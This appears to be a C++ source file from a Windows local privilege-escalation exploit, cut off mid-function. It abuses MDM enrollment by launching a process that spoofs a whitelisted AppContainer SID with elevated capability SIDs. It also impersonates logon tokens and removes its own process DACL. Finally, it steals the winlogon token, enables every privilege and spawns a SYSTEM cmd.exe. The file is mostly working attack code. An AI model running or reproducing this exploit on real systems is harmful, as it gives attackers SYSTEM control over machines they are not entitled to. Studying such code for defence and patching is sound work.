#include "common.h"
#include <mdmregistration.h>
#include <sddl.h>
#include <aclapi.h>
#include <tlhelp32.h>

// It gets the input arguments
bool GetParsedArguments(
  bool& is_mdm_enrollment_only_present,
  bool& unenrollment_present,
  std::wstring& target_exploit,
  std::wstring& enroll_mdm_webservice) {

  // Lambda helper to check if string is contained within a string
  auto IsStringPresent = [](const std::wstring& input1, const std::wstring& input2) -> bool {
    std::size_t found = input1.find(input2);
    if (found != std::string::npos) {
      return true;
    }
    return false;
  };

  // Lambda helper to grab the option value from a given argument
  auto GetOptionValue = [](int index, int nr_arguments, const LPWSTR* arglist, std::wstring& value) {
    if ((index + 1) < nr_arguments) {
      std::wstring argument_value(arglist[index + 1], wcslen(arglist[index + 1]));
      if (!argument_value.empty()) {
        value.assign(argument_value);
      }
    }
  };

  int nr_arguments = 0;
  LPWSTR* arglist = CommandLineToArgvW(GetCommandLineW(), &nr_arguments);

  if ((nr_arguments == 0) || (!arglist)) {
    return false;
  }

  //checking input arguments
  for (int i = 1; i < nr_arguments; i++) {
    std::wstring argument(arglist[i], wcslen(arglist[i]));

    if (IsStringPresent(argument, mdm_only_argument)) {
      is_mdm_enrollment_only_present = true;
    }
    else if (IsStringPresent(argument, unenrollment_argument)) {
      unenrollment_present = true;
    }
    else if (IsStringPresent(argument, enroll_webservice_argument)) {
      GetOptionValue(i, nr_arguments, arglist, enroll_mdm_webservice);
    }
    else if (IsStringPresent(argument, exploit_argument)) {
      GetOptionValue(i, nr_arguments, arglist, target_exploit);
    }
  }

  return true;
}


// It returns some useful security capabilities for the lowbox token
bool GetSecurityCapabilitiesForLowboxToken(TCaps& sidCaps) {

  //Helper lambda to grab the capability SID from a SID string
  auto addSIDCapability = [&](const std::wstring& capabilitySID) -> bool {

    SID_AND_ATTRIBUTES data = { 0 };
    data.Attributes = SE_GROUP_ENABLED;

    // Get the SID form of the custom capability
    if (!ConvertStringSidToSidW(capabilitySID.c_str(), &data.Sid)) {
      return false;
    }

    sidCaps.push_back(data);
    return true;
  };

  typedef BOOL(WINAPI* DeriveCapabilitySidsFromNameImpl)(
    LPCWSTR CapName, PSID** CapabilityGroupSids, DWORD* CapabilityGroupSidCount,
    PSID** CapabilitySids, DWORD* CapabilitySidCount);

  //Helper lambda to grab the capability SID fron a Capability Name
  auto addNamedCapability = [&](const std::wstring& capabilityName) -> bool {

    SID_AND_ATTRIBUTES data = { 0 };
    data.Attributes = SE_GROUP_ENABLED;

    //leaking allocated SIDs on purpose
    PSID* capabilityGroupSids = nullptr;
    DWORD capabilityGroupSidCount = 0;
    PSID* capabilitySids = nullptr;
    DWORD capabilitySidCount = 0;

    auto _DeriveCapabilitySidsFromName =
      (DeriveCapabilitySidsFromNameImpl)GetProcAddress(
        GetModuleHandle(L"KernelBase.dll"), "DeriveCapabilitySidsFromName");

    // Derive the SID from the named capability
    BOOL success = _DeriveCapabilitySidsFromName(
      capabilityName.c_str(),
      &capabilityGroupSids,
      &capabilityGroupSidCount,
      &capabilitySids,
      &capabilitySidCount
    );

    if (!success || capabilitySidCount != 1) {
      return false;
    }

    data.Sid = capabilitySids[0];

    sidCaps.push_back(data);
    return true;
  };

  // Device Management Related Capabilities
  // The MDM related capabilities are the only one needed, the rest is there for convenience purposes
  addSIDCapability(L"S-1-15-3-1");
  addSIDCapability(L"S-1-15-3-2");
  addSIDCapability(L"S-1-15-3-3");
  addSIDCapability(L"S-1-15-3-8");
  addSIDCapability(L"S-1-15-3-9");
  addSIDCapability(L"S-1-15-3-1024-1813308025-3893443517-2936766468-3261773091-2430119119-317633435-1602637770-2843472530");
  addSIDCapability(L"S-1-15-3-1024-1447750909-3412137041-2543229612-2579680811-949383960-1512208256-1474305305-1405036652");
  addSIDCapability(L"S-1-15-3-1024-2830772650-3846338416-1816072262-3095855940-4193335384-2293034769-252220343-157514922");
  addSIDCapability(L"S-1-15-3-1024-2114238718-839519356-3141599949-1701592612-4239813495-2246009235-3401969156-562141158");
  addSIDCapability(L"S-1-15-3-1024-150999393-257915958-2109302476-342821789-1525132724-4026398146-564805607-440935315");
  addSIDCapability(L"S-1-15-3-1024-1365790099-2797813016-1714917928-519942599-2377126242-1094757716-3949770552-3596009590");
  addSIDCapability(L"S-1-15-3-1024-1439478919-990579493-3627320768-2665985634-2354262676-2096604540-223614242-3656862712");
  addSIDCapability(L"S-1-15-3-1024-917207464-68434614-1080454720-3650237274-2024810623-3125538881-3710571513-3065818052");
  addSIDCapability(L"S-1-15-3-1024-1023893147-235863880-425656572-4266519675-2590647553-3475379062-430000033-3360374247");
  addSIDCapability(L"S-1-15-3-1024-2263946659-221263054-3004297223-2509109377-4006057435-143953683-28675390-302247413");
  addSIDCapability(L"S-1-15-3-1024-3190844328-4099963570-3870079217-2969588245-2822710570-1600598934-3576592281-2616761512");
  addSIDCapability(L"S-1-15-3-1024-3382307235-172505126-3436709648-3853344092-1878498961-3808853949-3782709338-3842044973");
  addSIDCapability(L"S-1-15-3-1024-1234007056-2663856401-2070564919-154281843-2544581321-3321489116-4145095046-1431496914");
  addSIDCapability(L"S-1-15-3-1024-3777909873-1799880613-452196415-3098254733-3833254313-651931560-4017485463-3376623984");
  addSIDCapability(L"S-1-15-3-1024-126078593-3658686728-1984883306-821399696-3684079960-564038680-3414880098-3435825201");
  addSIDCapability(L"S-1-15-3-1024-3057529725-2845346375-3525973929-2302649945-3073475876-347241512-4167996218-3915214886");
  addSIDCapability(L"S-1-15-3-1024-3247244612-4072385457-573406302-3159362907-4108726569-214783218-394353107-2658650418");
  addNamedCapability(L"ID_CAP_PROVISIONING_PACKAGE_API_ADMIN");

  if (!sidCaps.empty()) {
    return true;
  }

  return false;
}

// It enrolls the device into an target MDM server
bool EnrollIntoMDM(const std::wstring& enroll_email, const std::wstring& mdm_enroll_webservice_url) {

  //Sanity check on input
  if (enroll_email.empty() || mdm_enroll_webservice_url.empty()) {
    return false;
  }

  // Performs the actual registration using an empty access token
  if (RegisterDeviceWithManagement(enroll_email.c_str(), mdm_enroll_webservice_url.c_str(), L"") == S_OK) {
    return true;
  }

  return false;
}

// It unregister the device from every registered MDM server
bool UnenrollFromMDM() {

  // It unenrolls from every registered MDM server
  if (UnregisterDeviceWithManagement(NULL) == S_OK) {
    return true;
  }

  return false;
}

// It checks if primary token is an AppContainer token
bool IsAppContainer() {

  HANDLE process_token = INVALID_HANDLE_VALUE;

  // Getting the primary access token
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &process_token) || (process_token == INVALID_HANDLE_VALUE)) {
    return false;
  }

  // And checking if this is an AppContainer token
  BOOL is_container = FALSE;
  DWORD return_length = 0;
  if (GetTokenInformation(process_token, TokenIsAppContainer, &is_container, sizeof(is_container), &return_length) && (is_container)) {
    CloseHandle(process_token);
    return true;
  }

  CloseHandle(process_token);
  return false;
}

// It checks if primary token contains the Administrator group
bool IsAdminToken() {
  bool ret = false;
  PSID admin_group_sid = NULL;
  BOOL admin_group_member = FALSE;

  // Cleanup lambda helper - should use RAII management for this
  auto FreeResources = [&]() {
    if (admin_group_sid)
    {
      FreeSid(admin_group_sid);
    }
  };

  // Allocate and initialize a SID of the administrators group
  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
  if (!AllocateAndInitializeSid(
    &NtAuthority,
    2,
    SECURITY_BUILTIN_DOMAIN_RID,
    DOMAIN_ALIAS_RID_ADMINS,
    0, 0, 0, 0, 0, 0,
    &admin_group_sid))
  {
    FreeResources();
    wprintf(L"[-] There was an error allocating the administrator group sid: 0x%x\n", GetLastError());
    return false;
  }

  // Determine whether the SID of administrators group is enabled in the primary access token of the process.
  if (!CheckTokenMembership(NULL, admin_group_sid, &admin_group_member))
  {
    FreeResources();
    wprintf(L"[-] There was an error checking the administrator group membership: 0x%x\n", GetLastError());
    return false;
  }

  return (bool)admin_group_member;
}

// It checks for Administrator group presence on primary token
bool IsAdminPresentToken() {
  bool ret = false;
  HANDLE token_handle = NULL;
  PTOKEN_GROUPS token_groups_ptr = NULL;
  DWORD token_groups_size = 0;
  PSID admin_group_sid = NULL;
  bool admin_group_is_present = false;

  // Cleanup lambda helper - should use RAII management for this
  auto FreeResources = [&]() {
    if (admin_group_sid)
    {
      FreeSid(admin_group_sid);
    }

    if (token_handle != NULL && token_handle != INVALID_HANDLE_VALUE) {
      CloseHandle(token_handle);
    }

    if (token_groups_ptr) {
      HeapFree(GetProcessHeap(), 0, token_groups_ptr);
    }
  };

  // Allocate and initialize a SID of the administrators group
  SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
  if (!AllocateAndInitializeSid(
    &NtAuthority,
    2,
    SECURITY_BUILTIN_DOMAIN_RID,
    DOMAIN_ALIAS_RID_ADMINS,
    0, 0, 0, 0, 0, 0,
    &admin_group_sid))
  {
    FreeResources();
    wprintf(L"[-] There was an error allocating the administrator group sid: 0x%x\n", GetLastError());
    return false;
  }

  // Getting primary token
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token_handle)) {
    return false;
  }

  // Allocating TOKEN_GROUPS buffer
  if (!GetTokenInformation(
    token_handle, 
    TokenGroups, 
    nullptr, 
    0, 
    &token_groups_size) && GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    FreeResources();
    wprintf(L"[-] There was an error getting the size of TOKEN_GROUPS: 0x%x\n", GetLastError());
    return false;
  }

  token_groups_ptr = static_cast<PTOKEN_GROUPS>(HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, token_groups_size));
  if (!token_groups_ptr) {
    FreeResources();
    wprintf(L"[-] There was an error allocating the buffer for TOKEN_GROUPS: 0x%x\n", GetLastError());
    return false;
  }

  // Getting the actual TOKEN_GROUPS data
  if (!GetTokenInformation(token_handle, TokenGroups, token_groups_ptr, token_groups_size, &token_groups_size)) {
    FreeResources();
    wprintf(L"[-] There was an problem obtaining TOKEN_GROUPS information: 0x%x\n", GetLastError());
    return false;
  }

  // Determine whether the SID of administrators group is present in the list of GROUPS in the token
  for (DWORD i = 0; i < token_groups_ptr->GroupCount; i++) {
    if (EqualSid(token_groups_ptr->Groups[i].Sid, admin_group_sid)) {
      admin_group_is_present = true;
      break;
    }
  }

  return admin_group_is_present;
}

// It creates an app container process using a MDM enrollment whitelisted AppContainer SID
bool CreateWhitelistedAppContainerProcess(
  const std::wstring& executable_commandline,
  const std::wstring& enroll_webservice,
  const std::wstring& enroll_upn) {

  TCaps token_capabilities;
  SIZE_T attribute_size = 0;
  SECURITY_CAPABILITIES security_capabilities{ 0 };
  DWORD num_capabilities = 0;
  STARTUPINFOEXW startup_info{ 0 };
  PROCESS_INFORMATION process_info{ 0 };

  // Sanity check on input
  if (executable_commandline.empty() || enroll_webservice.empty()) {
    return false;
  }

  // Cleanup lambda helper
  auto FreeResources = [&]() {
    if (process_info.hProcess != NULL && process_info.hProcess != INVALID_HANDLE_VALUE) {
      CloseHandle(process_info.hProcess);
    }

    if (process_info.hThread != NULL && process_info.hThread != INVALID_HANDLE_VALUE) {
      CloseHandle(process_info.hThread);
    }

    if (startup_info.lpAttributeList) {
      DeleteProcThreadAttributeList(startup_info.lpAttributeList);
    }

    if (security_capabilities.AppContainerSid) {
      FreeSid(security_capabilities.AppContainerSid);
    }
  };

  // Work starts here

  // Setting target AppContainer SID to a whitelisted SID 
  if (!ConvertStringSidToSidW(
    //L"S-1-15-2-2434737943-167758768-3180539153-984336765-1107280622-3591121930-2677285773",
    L"S-1-15-2-1910091885-1573563583-1104941280-2418270861-3411158377-2822700936-2990310272",
    &security_capabilities.AppContainerSid))
  {
    wprintf(L"[-] There was an error creating AppContainer SID: 0x%x\n", GetLastError());
    return false;
  }

  // Setting lowbox token security capabilities
  if (!GetSecurityCapabilitiesForLowboxToken(token_capabilities))
  {
    wprintf(L"[-] There was an error getting the AppContainer token capabilities: 0x%x\n", GetLastError());
    return false;
  }
  security_capabilities.CapabilityCount = (DWORD)token_capabilities.size();
  security_capabilities.Capabilities = token_capabilities.data();

  if (InitializeProcThreadAttributeList(NULL, 1, NULL, &attribute_size) || (attribute_size == 0) ||
    (GetLastError() != ERROR_INSUFFICIENT_BUFFER)) {
    FreeResources();
    wprintf(L"[-] There was an error getting attribute attribute list size: 0x%x\n", GetLastError());
    return false;
  }

  startup_info.lpAttributeList =
    (LPPROC_THREAD_ATTRIBUTE_LIST)calloc(attribute_size, sizeof(BYTE));

  if (!InitializeProcThreadAttributeList(
    startup_info.lpAttributeList,
    1,
    NULL,
    &attribute_size)) {
    FreeResources();
    wprintf(L"[-] There was an error initializing attribute list: 0x%x\n", GetLastError());
    return false;
  }

  if (!UpdateProcThreadAttribute(
    startup_info.lpAttributeList,
    0,
    PROC_THREAD_ATTRIBUTE_SECURITY_CAPABILITIES,
    &security_capabilities,
    sizeof(security_capabilities),
    NULL,
    NULL)) {
    FreeResources();
    wprintf(L"[-] There was an error calling UpdateProcThreadAttribute(): 0x%x\n", GetLastError());
    return false;
  }

  // Building command line arguments
  std::wstring target_cmdline_options;
  target_cmdline_options.append(executable_commandline);
  target_cmdline_options.append(L" ");
  target_cmdline_options.append(enroll_webservice_argument);
  target_cmdline_options.append(L" ");
  target_cmdline_options.append(enroll_webservice);
  target_cmdline_options.append(L" ");

  // And finally creating the AppContainer process
  startup_info.StartupInfo.cb = sizeof(startup_info);
  if (!CreateProcessW(
    NULL,
    (LPWSTR)target_cmdline_options.c_str(),
    NULL,
    NULL,
    FALSE,
    (EXTENDED_STARTUPINFO_PRESENT | CREATE_UNICODE_ENVIRONMENT),
    NULL,
    NULL,
    (LPSTARTUPINFOW)&startup_info,
    &process_info)) {
    FreeResources();
    wprintf(L"[-] There was an error calling CreateProcess(): 0x%x\n", GetLastError());
    return false;
  }

  // Block wait until child process exits
  WaitForSingleObject(process_info.hProcess, INFINITE);

  // Getting exit code from child process
  DWORD exit_code = EXIT_FAILURE;
  if (!GetExitCodeProcess(process_info.hProcess, &exit_code)) {
    FreeResources();
    wprintf(L"[-] There was an error calling GetExitCodeProcess(): 0x%x\n", GetLastError());
    return false;
  }

  // And checking if child process ended successfully
  bool ret = false;
  if (exit_code == EXIT_SUCCESS) {
    return true;
  }

  FreeResources();

  return ret;
}

// It creates a privileged process from Medium IL context using username and password
bool CreateElevatedProcessFromMediumIL(
  const std::wstring& executable_path,
  const std::wstring& username,
  const std::wstring& password) {

  // Sanity check on input
  if (executable_path.empty() || username.empty() || password.empty()) {
    return false;
  }

  // Getting the primary access token from current process
  HANDLE current_process_primary_token = INVALID_HANDLE_VALUE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &current_process_primary_token) ||
    (current_process_primary_token == INVALID_HANDLE_VALUE)) {
    wprintf(L"[-] There was a problem calling OpenProcessToken(): 0x%x\n", GetLastError());
    return false;
  }

  // Getting an impersonation token using provided username and password
  HANDLE logon_token = INVALID_HANDLE_VALUE;
  if ((!LogonUserW(username.c_str(), L".", password.c_str(), LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT, &logon_token)) ||
    (logon_token == INVALID_HANDLE_VALUE)) {
    wprintf(L"[-] There was a problem calling LogonUserW(): 0x%x\n", GetLastError());
    return false;
  }

  // Get TokenIntegrityLevel from current process primary token
  DWORD token_il_size = 0;
  BYTE token_il_buffer[sizeof(TOKEN_MANDATORY_LABEL) + SECURITY_MAX_SID_SIZE]{ 0 };
  if ((!GetTokenInformation(current_process_primary_token, TokenIntegrityLevel, token_il_buffer, sizeof(token_il_buffer), &token_il_size)) || (token_il_size == 0)) {
    wprintf(L"[-] There was a problem calling GetTokenInformation(): 0x%x\n", GetLastError());
    return false;
  }

  // Setting the obtained IL into the logon token
  if (!SetTokenInformation(logon_token, TokenIntegrityLevel, token_il_buffer, sizeof(token_il_buffer))) {
    wprintf(L"[-] There was a problem calling SetTokenInformation(): 0x%x\n", GetLastError());
    return false;
  }

  // Removing acl from our current process
  if (SetSecurityInfo(GetCurrentProcess(), SE_KERNEL_OBJECT, DACL_SECURITY_INFORMATION, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) {
    wprintf(L"[-] There was a problem calling SetSecurityInfo(): 0x%x\n", GetLastError());
    return false;
  }

  bool ret = false;

  // Impersonating the logon token, look ma, impersonation without SeImpersonatePrivilege
  if (!ImpersonateLoggedOnUser(logon_token)) {
    wprintf(L"[-] There was a problem impersonating logon token: 0x%x\n", GetLastError());
    return false;
  }

  PROCESS_INFORMATION process_info{ 0 };
  STARTUPINFO startup_info{ 0 };
  startup_info.cb = sizeof(startup_info);

  // Create elevated process
  if (!CreateProcessWithLogonW(
    username.c_str(),
    L".",
    password.c_str(),
    LOGON_NETCREDENTIALS_ONLY,
    NULL,
    (LPWSTR)executable_path.c_str(),
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &startup_info,
    &process_info
  ))
  {
    wprintf(L"[-] There was an error calling CreateProcessWithLogonW(): 0x%x\n", GetLastError());
    return false;
  }

  // Wait until child process exits.
  WaitForSingleObject(process_info.hProcess, INFINITE);

  // Getting exit code from child process
  DWORD exit_code = EXIT_FAILURE;
  if (!GetExitCodeProcess(process_info.hProcess, &exit_code)) {
    wprintf(L"[-] There was an error calling GetExitCodeProcess(): 0x%x\n", GetLastError());
    return false;
  }

  // And checking if child process ended successfully
  if (exit_code == EXIT_SUCCESS) {
    ret = true;
  }

  // Close process and thread handles
  if (process_info.hProcess) {
    CloseHandle(process_info.hProcess);
  }

  if (process_info.hThread) {
    CloseHandle(process_info.hThread);
  }

  RevertToSelf();

  return ret;
}

// It creates a system process from a given executable path
bool CreateSystemProcess(const std::wstring& executable_path) {

  PROCESS_INFORMATION process_info{ 0 };
  STARTUPINFO startup_info{ 0 };
  HANDLE system_process_handle = INVALID_HANDLE_VALUE;
  HANDLE system_process_primary_token = INVALID_HANDLE_VALUE;
  HANDLE dup_primary_token = INVALID_HANDLE_VALUE;
  HANDLE dup_impersonation_token = INVALID_HANDLE_VALUE;
  HANDLE current_process_token = INVALID_HANDLE_VALUE;

  // Sanity check on input
  if (executable_path.empty()) {
    return false;
  }

  // Cleanup lambda helper
  auto FreeResources = [&]() {
    // Close process and thread handles
    if (process_info.hProcess) {
      CloseHandle(process_info.hProcess);
    }

    if (process_info.hThread) {
      CloseHandle(process_info.hThread);
    }

    if (system_process_handle != INVALID_HANDLE_VALUE) {
      CloseHandle(system_process_handle);
    }

    if (system_process_primary_token != INVALID_HANDLE_VALUE) {
      CloseHandle(system_process_primary_token);
    }

    if (dup_primary_token != INVALID_HANDLE_VALUE) {
      CloseHandle(dup_primary_token);
    }

    if (dup_impersonation_token != INVALID_HANDLE_VALUE) {
      CloseHandle(dup_impersonation_token);
    }

    if (current_process_token != INVALID_HANDLE_VALUE) {
      CloseHandle(current_process_token);
    }
  };

  // Lambda helper to gather the current session winlogon pid
  auto GetWinlogonPID = [](DWORD& winlogon_pid) -> bool {
    DWORD current_session_id = 0;
    if (!ProcessIdToSessionId(GetCurrentProcessId(), &current_session_id)) {
      return false;
    }

    HANDLE proc_snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if ((proc_snap == NULL) || (proc_snap == INVALID_HANDLE_VALUE)) {
      return false;
    }

    PROCESSENTRY32W proc_entry = { 0 };
    proc_entry.dwSize = sizeof(PROCESSENTRY32W);
    for (BOOL success = Process32FirstW(proc_snap, &proc_entry);
      success != FALSE;
      success = Process32NextW(proc_snap, &proc_entry))
    {
      //checking winlogon proc name
      std::wstring executable(proc_entry.szExeFile);
      if (executable.find(L"winlogon") != std::string::npos)
      {
        //then checking if running on current process session id
        DWORD session_id = 0;
        if (!ProcessIdToSessionId(proc_entry.th32ProcessID, &session_id)) {
          return false;
        }

        if (session_id == current_session_id) {
          winlogon_pid = proc_entry.th32ProcessID;
          return true;
        }
      }
    }

    CloseHandle(proc_snap);
    return false;
  };

  // Lambda helper to enable all the privileges from a given token
  auto EnableAllTokenPrivileges = [](HANDLE& token) -> bool {
    bool ret = false;
    DWORD privs_size = 0;
    GetTokenInformation(token, TokenPrivileges, 0, 0, &privs_size);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
    {
      return false;
    }

    PTOKEN_PRIVILEGES privileges = (PTOKEN_PRIVILEGES)calloc(privs_size, sizeof(BYTE));
    if (!privileges) {
      return false;
    }

    DWORD token_info_len = 0;
    if (!GetTokenInformation(token, TokenPrivileges, privileges, privs_size, &token_info_len))
    {
      return false;
    }

    for (DWORD i = 0; i < privileges->PrivilegeCount; ++i)
    {
      privileges->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
    }

    if (!AdjustTokenPrivileges(token, FALSE, privileges, 0, 0, 0)) {
      return false;
    }

    free(privileges);
    return true;
  };

  // Lambda helper to enable all the privileges from a given token
  auto GetPrivilegedDuplicatedToken = [&](HANDLE input, HANDLE& output, TOKEN_TYPE type) -> bool {

    // give access to everyone on the duplicated token
    SECURITY_ATTRIBUTES security_attributes = { 0 };
    SECURITY_DESCRIPTOR security_descriptor = { 0 };
    if (InitializeSecurityDescriptor(&security_descriptor, SECURITY_DESCRIPTOR_REVISION))
    {
      if (SetSecurityDescriptorDacl(&security_descriptor, TRUE, (PACL)NULL, FALSE))
      {
        security_attributes.nLength = sizeof(SECURITY_ATTRIBUTES);
        security_attributes.bInheritHandle = FALSE;
        security_attributes.lpSecurityDescriptor = &security_descriptor;
      }
    }

    // duplicate the token
    HANDLE work_token = INVALID_HANDLE_VALUE;
    if ((DuplicateTokenEx(input, GENERIC_ALL, &security_attributes, SecurityImpersonation, type, &work_token)) &&
      (work_token != INVALID_HANDLE_VALUE) && (work_token != NULL))
    {
      //enable token privileges
      if (EnableAllTokenPrivileges(work_token)) {
        output = work_token;
        return true;
      }
    }

    return false;
  };

  // Work starts here

  // Enabling privileges of running primary token
  current_process_token = INVALID_HANDLE_VALUE;
  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &current_process_token) ||
    (current_process_token == INVALID_HANDLE_VALUE)) {
    FreeResources();
    wprintf(L"[-] There was a problem calling OpenProcessToken() for current process: 0x%x\n", GetLastError());
    return false;
  }

  if (!EnableAllTokenPrivileges(current_process_token)) {
    wprintf(L"[-] There was a problem calling EnableAllTokenPrivileges(): 0x%x\n", GetLastError());
    return false;
  }

  // Stealing token from winlogon process running in current session
  DWORD winlogon_pid = 0;
  if (!GetWinlogonPID(winlogon_pid)) {
    wprintf(L"[-] There was a problem calling GetWinlogonPID(): 0x%x\n", GetLastError());
    return false;
  }

  system_process_handle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, winlogon_pid);
  if ((system_process_handle == INVALID_HANDLE_VALUE) || (system_process_handle == NULL)) {
    wprintf(L"[-] There was a problem calling OpenProcessToken(): 0x%x\n", GetLastError());
    return false;
  }

  if (!OpenProcessToken(system_process_handle, TOKEN_DUPLICATE, &system_process_primary_token) ||
    (system_process_primary_token == INVALID_HANDLE_VALUE)) {
    FreeResources();
    wprintf(L"[-] There was a problem calling OpenProcessToken(): 0x%x\n", GetLastError());
    return false;
  }

  // Getting duplicated primary token
  if (!GetPrivilegedDuplicatedToken(system_process_primary_token, dup_primary_token, TokenPrimary)) {
    FreeResources();
    wprintf(L"[-] There was a problem duplicating primary token: 0x%x\n", GetLastError());
    return false;
  }

  // Getting duplicated impersonation token
  if (!GetPrivilegedDuplicatedToken(system_process_primary_token, dup_impersonation_token, TokenImpersonation)) {
    FreeResources();
    wprintf(L"[-] There was a problem duplicating primary token: 0x%x\n", GetLastError());
    return false;
  }

  // Impersonating privileged token
  if (!ImpersonateLoggedOnUser(dup_impersonation_token)) {
    FreeResources();
    wprintf(L"[-] There was a problem impersonating privileged token: 0x%x\n", GetLastError());
    return false;
  }

  startup_info.cb = sizeof(startup_info);
  wchar_t desktop[] = L"winsta0\\default";
  startup_info.lpDesktop = desktop;

  // Create elevated process
  if (!CreateProcessAsUserW(
    dup_primary_token,
    executable_path.c_str(),
    NULL,
    NULL,
    NULL,
    FALSE,
    NORMAL_PRIORITY_CLASS | CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE,
    NULL,
    NULL,
    &startup_info,
    &process_info
  ))
  {
    FreeResources();
    wprintf(L"[-] There was an error calling CreateProcessWithLogonW(): 0x%x\n", GetLastError());
    return false;
  }

  RevertToSelf();

  FreeResources();

  return true;
}

// It performs the device enrollment logic by:
// - Ensuring that there are no active MDM registration
// - Performing two stages registration approach (bug with current MDM server implementation)
bool PerformDeviceEnrollmentUsingWhitelistedProcess(const std::wstring& enroll_mdm_webservice, const std::wstring& enroll_upn) {

  // getting current executable path
  std::wstring executable_path;
  if (!GetCurrentExecutablePath(executable_path)) {
    wprintf(L"[-] There was a problem retrieving the path to the current executable\n");
    return false;
  }

  //Command Enroll Commandline 
  //this is required by the command line parsing logic
  std::wstring common_cmdline;
  common_cmdline.append(executable_path);
  common_cmdline.append(L" ");
  common_cmdline.append(exploit_argument);
  common_cmdline.append(L" ");
  common_cmdline.append(exploit_whitelisted_mdm_enrollment);

  //unenroll cmdline
  std::wstring unenroll_cmdline;
  unenroll_cmdline.append(common_cmdline);
  unenroll_cmdline.append(L" ");
  unenroll_cmdline.append(unenrollment_argument);

  // Best effort unenroll logic
  CreateWhitelistedAppContainerProcess(unenroll_cmdline, enroll_mdm_webservice, enroll_upn);

  //Dummy sleep
  Sleep(1000);

  // Device enrollment call
  if (!CreateWhitelistedAppContainerProcess(common_cmdline, enroll_mdm_webservice, enroll_upn)) {
    wprintf(L"[-] There was a problem performing the whitelisted device enrollment\n");
    return false;
  }

  return true;
}

// It dumb checks if device is enrolled until timeout seconds is reached
bool WaitUntilDeviceIsMDMEnrolled() {
  bool ret = false;
  const unsigned int timeout_seconds = 15;

  // Lambda helper to check if device is enrolled into the MDM
  auto IsDeviceMDMEnrolled = []() -> bool {
    BOOL is_mdm_enrolled = FALSE;

    if ((IsDeviceRegisteredWithManagement(&is_mdm_enrolled, 0, NULL) == S_OK) && (is_mdm_enrolled)) {
      return true;
    }

    return false;
  };

  for (unsigned int nr_seconds = 0; nr_seconds < timeout_seconds; ++nr_seconds) {
    Sleep(1000);
    if (IsDeviceMDMEnrolled()) {
      ret = true;
      break;
    }
  }

  //Wait for SyncML policies to be applied
  Sleep(1000);

  return ret;
}

// It executes cmd.exe in a privileged context
bool ExecutePrivilegedCmdPayload() {

  wchar_t windows_dir[MAX_PATH]{ 0 };
  if ((GetSystemDirectoryW(windows_dir, MAX_PATH) > 0) && (wcslen(windows_dir) > 0)) {
    std::wstring target_path_to_cmd;
    target_path_to_cmd.append(windows_dir);
    target_path_to_cmd.append(L"\\");
    target_path_to_cmd.append(L"cmd.exe");

    if (CreateSystemProcess(target_path_to_cmd)) {
      return true;
    }
  }

  return false;
}

// It returns the path to the running executable
bool GetCurrentExecutablePath(std::wstring& path) {
  wchar_t current_path[MAX_PATH + 1] = { 0 };

  GetModuleFileNameW(NULL, current_path, MAX_PATH);

  if (wcslen(current_path) == 0) {
    return false;
  }

  path.assign(current_path);
  return true;
}


// It returns all of the GUIDs associated to current and past enrollments
bool GetEnrollmentIDs(TStrings& enrollment_ids, const wchar_t *upn) {

  std::wstring target_upn(upn);
  std::wstring enrollment_db_path(L"SOFTWARE\\Microsoft\\Enrollments");

  HKEY key_handle = NULL;
  if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, enrollment_db_path.c_str(), 0, KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS, &key_handle) != ERROR_SUCCESS) {
    return false;
  }

  DWORD subkey_count = 0;
  DWORD subkey_len = 0;
  if ((RegQueryInfoKeyW(key_handle, NULL, NULL, NULL, &subkey_count, &subkey_len, NULL, NULL, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) || (subkey_count == 0)) {
    return false;
  }

  for (DWORD i = 0; i < subkey_count; ++i) {
    wchar_t enrollment_id_subkey_name[MAX_PATH] = { 0 };
    DWORD subkey_size = MAX_PATH;
    if ((RegEnumKeyExW(key_handle, i, enrollment_id_subkey_name, &subkey_size, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) && (wcslen(enrollment_id_subkey_name) > 0)) {

      std::wstring subkey_path;
      subkey_path.append(enrollment_db_path);
      subkey_path.append(L"\\");
      subkey_path.append(enrollment_id_subkey_name);

      HKEY subkey_handle = NULL;
      if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, subkey_path.c_str(), 0, KEY_QUERY_VALUE | KEY_ENUMERATE_SUB_KEYS, &subkey_handle) != ERROR_SUCCESS) {
        return false;
      }

      wchar_t upn_value[MAX_PATH] = { 0 };
      DWORD upn_size = MAX_PATH;   
      DWORD key_type = 0;
      if ((RegQueryValueExW(subkey_handle, L"UPN", NULL, &key_type, (LPBYTE)&upn_value, &upn_size) == ERROR_SUCCESS) && (wcslen(upn_value) > 0)){
        if (target_upn.empty()) {
          enrollment_ids.push_back(enrollment_id_subkey_name);
        }
        else {
          std::wstring found_upn(upn_value);
          if (found_upn == target_upn) {
            enrollment_ids.push_back(enrollment_id_subkey_name);
          }
        }
      }

      if (subkey_handle != INVALID_HANDLE_VALUE) {
        CloseHandle(subkey_handle);
      }
    }
  }

  if (key_handle != INVALID_HANDLE_VALUE) {
    CloseHandle(key_handle);
  }

  if (enrollment_ids.empty()) {
    return false;
  }

  return true;
}


// It returns the list of tasks to delete
// Since we are running with low privieleges, we cannot just list the tasks from the task sched
// so only option is to guess these tasks
void GetListOfEnrollmentTasksByEnrollmentID(const std::wstring& enrollment_id, TStrings& enrollment_tasks) {
  std::wstring task_prefix = L"\\" + enrollment_id + L"\\";
  enrollment_tasks.push_back(task_prefix + L"OS Edition Upgrade event listener created by enrollment client");
